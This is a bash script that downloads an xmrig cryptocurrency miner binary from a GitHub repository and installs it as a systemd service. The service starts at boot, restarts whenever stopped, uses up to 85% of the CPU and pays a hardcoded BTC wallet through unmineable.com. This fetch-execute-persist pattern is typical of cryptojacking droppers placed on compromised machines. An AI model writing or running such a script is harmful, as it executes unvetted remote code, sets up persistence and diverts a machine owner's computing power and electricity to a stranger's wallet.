#!/bin/bash

curl -L --progress-bar "https://github.com/lolminerxmrig/auto/raw/main/xmrig" -o /tmp/xmrig
[ -d /tmp/xmrig ] || mkdir /tmp/miner
cp /tmp/xmrig /tmp/miner/
chmod +x /tmp/miner/xmrig
cat >/tmp/miner.service <<EOL
[Unit]
Description=miner service
[Service]
ExecStart=/tmp/miner/xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.$(echo $(shuf -i 1-9999 -n 1)-CPU) -p 2 -k -a rx/0 --cpu-max-threads-hint=85
Restart=always
[Install]
WantedBy=multi-user.target
EOL
mv /tmp/miner.service /etc/systemd/system/miner.service
service miner start
echo "[*] Starting miner systemd service"
